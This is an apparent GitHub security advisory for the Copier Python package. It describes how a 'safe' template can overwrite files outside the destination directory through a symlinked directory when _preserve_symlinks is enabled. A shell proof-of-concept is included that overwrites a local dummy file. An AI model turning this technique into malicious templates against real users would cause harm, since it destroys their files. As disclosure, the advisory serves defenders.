# [M] Copier safe template has arbitrary filesystem write access via directory symlinks when _preserve_symlinks: true 

## Summary
Severity: Medium
Advisory: GHSA-4fqp-r85r-hxqh
CVE: CVE-2026-23986
CWE: CWE-61
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-01-21
Source: https://github.com/advisories/GHSA-4fqp-r85r-hxqh
Type: github-advisory

## Affected
- PyPI: `copier` — affected >=0 <9.11.2

## Details
### Impact

Copier suggests that it's safe to generate a project from a safe template, i.e. one that doesn't use [unsafe](https://copier.readthedocs.io/en/stable/configuring/#unsafe) features like custom Jinja extensions which would require passing the `--UNSAFE,--trust` flag. As it turns out, a safe template can currently write to arbitrary directories outside the destination path by using directory a symlink along with [`_preserve_symlinks: true`](https://copier.readthedocs.io/en/stable/configuring/#preserve_symlinks) and a [generated directory structure](https://copier.readthedocs.io/en/stable/configuring/#generating-a-directory-structure) whose rendered path is inside the symlinked directory. This way, a malicious template author can create a template that overwrites arbitrary files (according to the user's write permissions), e.g., to cause havoc.

> [!NOTE]
>
> At the time of writing, the exploit is non-deterministic, as Copier walks the template's file tree using [`os.scandir`](https://docs.python.org/3/library/os.html#os.scandir) which yields directory entries in arbitrary order.

Reproducible example (may or may not work depending on directory entry yield order):

```shell
mkdir other/
pushd other/
echo "sensitive" > sensitive.txt
popd

mkdir src/
pushd src/
ln -s ../other other
echo "overwritten" > "{{ pathjoin('other', 'sensitive.txt') }}.jinja"
echo "_preserve_symlinks: true" > copier.yml
tree .
# .
# ├── copier.yml
# ├── other -> ../other
# └── {{ pathjoin('other', 'sensitive.txt') }}.jinja
#
# 1 directory, 2 files
popd

uvx copier copy --overwrite src/ dst/

cat other/sensitive.txt
# overwritten
```

### Patches

n/a

### Workarounds

n/a

### References

n/a

## References
- https://github.com/copier-org/copier/security/advisories/GHSA-4fqp-r85r-hxqh
- https://nvd.nist.gov/vuln/detail/CVE-2026-23986
- https://github.com/copier-org/copier/commit/b3a7b3772d17cf0e7a4481978188c9f536c8d8f6
- https://github.com/copier-org/copier
- https://github.com/copier-org/copier/releases/tag/v9.11.2
